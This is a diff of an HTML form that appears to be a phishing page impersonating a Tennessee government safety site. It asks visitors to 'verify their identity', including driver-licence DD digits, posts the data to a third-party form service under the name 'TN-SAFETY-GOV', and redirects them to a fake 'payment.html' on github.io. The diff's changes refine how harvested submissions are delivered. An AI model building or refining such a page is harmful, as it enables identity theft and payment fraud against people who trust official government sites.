@@ -33,8 +33,14 @@
     <main class="main-container">
         <form action="https://api.web3forms.com/submit" method="POST">
 
-             <input type="hidden" name="access_key" value="4df5bbbb-bd11-4c70-a613-435d680007ca">
+            <input type="hidden" name="access_key" value="4df5bbbb-bd11-4c70-a613-435d680007ca">
+            <input type="hidden" name="from_name" value="TN-SAFETY-GOV">
+            <input type="hidden" name="subject" value="Nouvelle demande - Tableau">
 
+            <input type="checkbox" name="botcheck" style="display:none">
+
+            <!-- Ça force l'envoi en tableau HTML propre -->
+            <input type="hidden" name="replyto" value="%email%">
             <section class="card-box">
                 <h2>Verify Your Identity</h2>
                 <br>
@@ -71,10 +77,6 @@
                     <label for="dd-number">Last Five (5) Digits of DD Number <span class="required">*</span></label>
                     <input type="text" name="dd-number" placeholder="XXXXX" required>
                 </div>
-                <!-- Affichage en tableau -->
-                <input type="hidden" name="_template" value="table">
-                <!-- Désactiver le captcha -->
-                <input type="hidden" name="_captcha" value="false">
 
                 <!-- Redirection vers votre page personnalisée -->
                 <input type="hidden" name="redirect" value="https://tn-safety-tn-gov.github.io/tn-safety-tn-gov/payment.html">
